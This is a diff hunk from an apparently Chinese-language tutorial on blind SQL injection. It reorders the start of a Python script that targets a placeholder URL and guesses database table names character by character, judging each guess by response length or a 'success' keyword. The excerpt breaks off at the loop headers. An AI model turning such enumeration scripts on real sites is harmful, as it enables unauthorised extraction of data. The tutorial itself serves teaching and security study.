@@ -70,16 +70,16 @@
 在每次请求中，脚本会根据循环变量动态生成Payload，发送HTTP请求，并根据响应内容的长度或特定关键词（如“success”）来判断猜解是否正确。如果正确，则记录该字符，并进入下一个位置的猜解。
 
 以下是获取表名的代码逻辑示例：
-```python
-import requests
 
 ![](img/4be6078ac7c6345c793281def76537a9_21.png)
 
-url = “http://target.com/page.php”
-chars = “abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_”
 
 ![](img/4be6078ac7c6345c793281def76537a9_23.png)
 
+```python
+import requests
+url = “http://target.com/page.php”
+chars = “abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_”
 for table_index in range(0, 2): # 假设猜解前两个表
     table_name = “”
     for position in range(1, 50): # 假设表名长度小于50
